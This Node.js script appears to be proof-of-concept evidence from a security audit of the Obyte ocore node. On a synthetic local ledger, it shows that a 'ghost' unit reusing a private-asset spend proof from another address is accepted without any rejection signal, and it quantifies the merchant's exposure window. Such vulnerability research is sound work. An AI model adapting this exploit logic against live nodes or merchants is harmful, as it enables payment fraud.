// E1-8 — F3 merchant-exposure end-to-end
// The MERCHANT's node state: victim (merchant) spends private output X (unit C accepted 'good'),
// sender publishes the ghost (unit A, same spend proof P, attacker address) — accepted 'good' too.
// Demonstrate: the merchant's node gives NO rejection signal; both units 'good' on the MC path with
// the identical spend proof; no resolution path fires; quantify the exposure window.
//
// REAL PATH: composer.composeJoint -> validation.validate -> writer.saveJoint (same as p1-refute.js)
// Synthetic genesis (scope.md 7: locally generated keys, synthetic genesis, local only).
// No mocks. The spend-proof uniqueness check under test is the real validation.js:1637-1654 path.
//
// Run: node evidence/lab/e1-8/e1-8-merchant-exp.js   (data dir evidence/lab/e1-8/.e18data)
"use strict";
const path = require("path");
const fs = require("fs");
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
const OUT = path.join(__dirname);
const DATA = path.join(OUT, ".e18data");
fs.rmSync(DATA, { recursive: true, force: true });
fs.mkdirSync(DATA, { recursive: true });

const crypto = require("crypto");
const ecdsa = require(O_CORE + "/node_modules/secp256k1");

const desktop_app = require(O_CORE + "/desktop_app.js");
desktop_app.getAppRootDir = function () { return O_CORE; };
desktop_app.getAppDataDir = function () { return DATA; };

function makeKey() {
	let priv;
	do { priv = crypto.randomBytes(32); } while (!ecdsa.privateKeyVerify(priv));
	return { priv: priv.toString("hex"), pub: Buffer.from(ecdsa.publicKeyCreate(priv, true)).toString("base64") };
}
const signHash = (hashBuf, privHex) => Buffer.from(ecdsa.ecdsaSign(hashBuf, Buffer.from(privHex, "hex")).signature).toString("base64");
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

const objectHash0 = require(O_CORE + "/object_hash.js");
const keys = { sender: makeKey(), merchant: makeKey(), witness: makeKey() };
const defOf = (k) => ["sig", { pubkey: k.pub }];
const addrOf = (k) => objectHash0.getChash160(defOf(k));
const sender_addr = addrOf(keys.sender);
const merchant_addr = addrOf(keys.merchant);
const witness_addr = addrOf(keys.witness);
const TOTAL = 1e15;

function buildGenesis(objectHash, objectLength) {
	const g = {
		version: "4.0", alt: "1", timestamp: Math.round(Date.now() / 1000),
		authors: [{ address: witness_addr, definition: defOf(keys.witness), authentifiers: { r: "-" } }],
		messages: [], witnesses: [witness_addr], headers_commission: 0, payload_commission: 0,
	};
	const payload = {
		inputs: [{ type: "issue", amount: TOTAL, serial_number: 1 }],
		outputs: [
			{ address: sender_addr, amount: 0 },
			{ address: merchant_addr, amount: 0 },
			{ address: witness_addr, amount: 0 },
		],
	};
	g.messages = [{ app: "payment", payload_location: "inline", payload, payload_hash: objectHash.getBase64Hash(payload, true) }];
	g.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(g), keys.witness.priv);
	g.headers_commission = objectLength.getHeadersSize(g);
	g.payload_commission = objectLength.getTotalPayloadSize(g);
	const spendable = TOTAL - g.headers_commission - g.payload_commission;
	payload.outputs[0].amount = Math.floor(spendable * 0.6);
	payload.outputs[1].amount = Math.floor(spendable * 0.2);
	payload.outputs[2].amount = spendable - payload.outputs[0].amount - payload.outputs[1].amount;
	payload.outputs.sort((a, b) => (a.address < b.address ? -1 : 1));
	g.messages[0].payload_hash = objectHash.getBase64Hash(payload, true);
	g.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(g), keys.witness.priv);
	g.unit = objectHash.getUnitHash(g);
	return g;
}

async function main() {
	const constants = require(O_CORE + "/constants.js");
	const conf = require(O_CORE + "/conf.js");
	conf.bLight = true;

	const objectLength = require(O_CORE + "/object_length.js");
	const genesis = buildGenesis(objectHash0, objectLength);
	const genesisBall = objectHash0.getBallHash(genesis.unit);
	constants.GENESIS_UNIT = genesis.unit;
	constants.COUNT_WITNESSES = 1;
	constants.MAJORITY_OF_WITNESSES = 1;
	console.log("GENESIS:", genesis.unit, "ball:", genesisBall);

	const db = require(O_CORE + "/db.js");
	conf.bLight = false;
	await new Promise((resolve) => {
		db.takeConnectionFromPool((conn) => { conn.query("SELECT 1", () => { conn.release(); resolve(); }); });
	});
	const sysrows = [
		["op_list", JSON.stringify([witness_addr]), -1], ["threshold_size", "10000", -1],
		["base_tps_fee", "10", -1], ["tps_interval", "60", -1], ["tps_fee_multiplier", "10", -1],
	];
	for (const [subject, value, mci] of sysrows) {
		await new Promise((resolve) => {
			db.takeConnectionFromPool((conn) => {
				conn.query("INSERT OR IGNORE INTO system_vars (subject, value, vote_count_mci) VALUES (?,?,?)", [subject, value, mci], () => { conn.release(); resolve(); });
			});
		});
	}

	const storage = require(O_CORE + "/storage.js");
	const network = require(O_CORE + "/network.js");
	const validation = require(O_CORE + "/validation.js");
	const objectHash = require(O_CORE + "/object_hash.js");
	const composer = require(O_CORE + "/composer.js");
	const writer = require(O_CORE + "/writer.js");

	[
		"aa2UpgradeMci", "aa3UpgradeMci", "v4UpgradeMci", "pemCurvesFixMci", "noPrivateAssetsWithConditionsUpgradeMci",
		"timestampUpgradeMci", "includeKeySizesUpgradeMci", "lastBallStableInParentsUpgradeMci",
		"witnessedLevelMustNotRetreatUpgradeMci", "witnessedLevelMustNotRetreatFromAllParentsUpgradeMci",
		"branchedMinMcWlUpgradeMci", "altBranchByBestParentUpgradeMci", "spendUnconfirmedUpgradeMci",
		"bestParentPrefersOpUpgradeMci", "tpsFeeRecipientsFixMci", "unstableInitialDefinitionUpgradeMci",
	].forEach(k => { constants[k] = 0; });
	constants.COUNT_WITNESSES = 1;
	constants.MAJORITY_OF_WITNESSES = 1;

	const query = (sql, params) => new Promise((resolve) => {
		db.takeConnectionFromPool((conn) => {
			conn.query(sql, params || [], (rows) => { conn.release(); resolve(rows); });
		});
	});

	for (let i = 0; i < 200 && typeof storage.getMinRetrievableMci() !== "number"; i++) await sleep(100);
	console.log("DB-READY min_retrievable_mci=", storage.getMinRetrievableMci());

	function makeSigner(key) {
		return {
			readDefinition: (conn, address, cb) => cb(null, defOf(key)),
			readSigningPaths: (conn, address, cb) => cb({ r: constants.SIG_LENGTH }),
			readPrivateKey: (address, path, cb) => cb(null, Buffer.from(key.priv, "hex")),
		};
	}

	function validateAndSave(joint, label) {
		return new Promise((resolve, reject) => {
			validation.validate(joint, {
				ifOk: (objValidationState, unlock) => {
					console.log(label, "VALIDATION OK sequence=" + objValidationState.sequence);
					objValidationState.count_primary_aa_triggers = objValidationState.count_primary_aa_triggers || 0;
					writer.saveJoint(joint, objValidationState, null, () => {
						unlock();
						console.log(label, "SAVED", joint.unit.unit);
						resolve(objValidationState);
					});
				},
				ifUnitError: (e) => { console.log(label, "UNIT-ERROR", e); reject(new Error(label + " unit error: " + e)); },
				ifJointError: (e) => { console.log(label, "JOINT-ERROR", e); reject(new Error(label + " joint error: " + e)); },
				ifTransientError: (e) => { console.log(label, "TRANSIENT", e); reject(new Error(label + " transient: " + e)); },
				ifNeedParentUnits: (arr) => { console.log(label, "NEED-PARENTS", arr); reject(new Error(label + " need parents")); },
				ifNeedHashTree: () => { console.log(label, "NEED-HASH-TREE"); reject(new Error(label + " need hash tree")); },
			});
		});
	}

	function composeUnit(signer, address, spendProofs, label) {
		return new Promise((resolve, reject) => {
			composer.composeJoint({
				paying_addresses: [address],
				signing_addresses: [address],
				outputs: [{ address, amount: 0 }],
				witnesses: [witness_addr],
				messages: [{
					app: "payment",
					payload_location: "none",
					payload_hash: objectHash.getBase64Hash({ fake: label }),
					spend_proofs: spendProofs,
				}],
				signer,
				callbacks: {
					ifOk: (joint, assocPrivatePayloads, unlock_callback) => { unlock_callback(); resolve(joint); },
					ifError: (e) => reject(new Error(label + " compose error: " + JSON.stringify(e))),
					ifNotEnoughFunds: (e) => reject(new Error(label + " not enough funds: " + e)),
				},
			});
		});
	}

	// The merchant's acceptance criterion (the reasonable real-world rule):
	// "the payment is accepted" = the spend unit exists, sequence='good', is_on_main_chain=1
	function merchantAcceptance(rows) {
		const ok = rows.some(r => r.sequence === "good" && r.is_on_main_chain === 1);
		const state = rows.map(r => ({ unit: r.unit.slice(0, 12) + "…", mci: r.main_chain_index, seq: r.sequence, onMC: r.is_on_main_chain }));
		return { ok, state };
	}

	// ---- genesis ----
	await validateAndSave({ unit: genesis, ball: genesisBall }, "GENESIS");

	// P = the bearer spend proof for private output X (sender retains the blinding — bearer design)
	const P = objectHash.getBase64Hash({ asset: "X", amount: 123, address: merchant_addr, blinding: "sender-retains" });

	// ---- STEP 1: the merchant's payment — victim spends X (unit C) ----
	const merchantSigner = makeSigner(keys.merchant);
	const C = await composeUnit(merchantSigner, merchant_addr, [{ spend_proof: P }], "C-merchant-payment");
	await validateAndSave(C, "C");
	const cRows = await query("SELECT unit, main_chain_index, is_stable, sequence, is_on_main_chain FROM units WHERE unit=?", [C.unit.unit]);
	const cAcc = merchantAcceptance(cRows);
	console.log("MERCHANT-ACCEPTANCE after C:", JSON.stringify(cAcc));

	// ---- STEP 2: the ghost — sender publishes A (same P, sender address) ----
	const senderSigner = makeSigner(keys.sender);
	const A = await composeUnit(senderSigner, sender_addr, [{ spend_proof: P }], "A-ghost");
	await validateAndSave(A, "A"); // ifOk = accepted, NO rejection event
	console.log("GHOST-ARRIVAL: accepted (ifOk), no rejection/error signal emitted");

	// ---- STEP 3: merchant's node state AFTER the ghost — re-evaluate acceptance ----
	const allUnits = await query("SELECT unit, main_chain_index, is_stable, sequence, is_on_main_chain FROM units ORDER BY main_chain_index");
	console.log("UNITS-AFTER-GHOST:", JSON.stringify(allUnits.map(u => ({ u: u.unit.slice(0, 12) + "…", mci: u.main_chain_index, seq: u.sequence, onMC: u.is_on_main_chain }))));
	const spRows = await query("SELECT unit, address, spend_proof FROM spend_proofs ORDER BY spend_proof_index");
	console.log("SPEND-PROOFS-AFTER-GHOST:", JSON.stringify(spRows.map(r => ({ unit: r.unit.slice(0, 12) + "…", address: r.address.slice(0, 12) + "…", spend_proof: r.spend_proof.slice(0, 16) + "…" }))));
	const sameProofCount = spRows.filter(r => r.spend_proof === P).length;

	// the merchant's acceptance rule applied to the WHOLE ledger (both units carry P):
	const ghostAcc = merchantAcceptance(allUnits);
	console.log("MERCHANT-ACCEPTANCE after ghost (any 'good' on-MC unit with P):", JSON.stringify(ghostAcc));

	// ---- STEP 4: does any resolution path fire? same-author conflict check ----
	// checkSerialAddressUse / findConflictingUnits is author-keyed: C (merchant) vs A (sender)
	// are different authors -> no conflict. The input-level check needs the private payload
	// (bPrivate only in the payload flow) -> cannot run network-wide. Demonstrate the DB state:
	const cInputs = await query("SELECT * FROM inputs WHERE unit=?", [C.unit.unit]);
	const aInputs = await query("SELECT * FROM inputs WHERE unit=?", [A.unit.unit]);
	console.log("C-inputs:", cInputs.length, "A-inputs:", aInputs.length,
		"(C's payload chain would reference X; A's payload is rejected by the payload-side owner binding — divisible_asset.js:159)");

	// ---- STEP 5: exposure window ----
	// C stays 'good' and on-MC indefinitely; A is also 'good' with the same P; no unit-level
	// resolution exists (different authors; spend-proof key is (P, address) so no match).
	// In the lab, both units persist 'good' -> the merchant's node state is "payment accepted"
	// while the ledger holds a second 'good' unit with the identical spend proof.
	console.log("EXPOSURE-WINDOW: C saved at T0; A accepted at T1; no resolution mechanism exists;",
		"the merchant's acceptance signal (good+onMC) is true for BOTH units for the entire window.",
		"Same-proof 'good' unit count:", sameProofCount);

	// ---- STEP 6: public-asset contrast (why this is private-specific) ----
	// For a public asset, the sender cannot author a second spend of the RECIPIENT's output
	// (no key). The bearer model is what lets the sender re-spend — and the spend-proof check
	// (the designed countermeasure) is address-keyed -> dodgeable. The contrast is structural:
	// public = second spend impossible; private = second spend possible AND undetected.
	console.log("CONTRAST: public-asset re-spend by the sender is impossible (no merchant key);",
		"private-asset re-spend is possible (bearer P) AND undetected (address-keyed check).");

	console.log("E1-8-DONE");
}

main().then(() => process.exit(0)).catch(e => { console.log("E1-8-ERROR:", e && e.message || e); process.exit(2); });
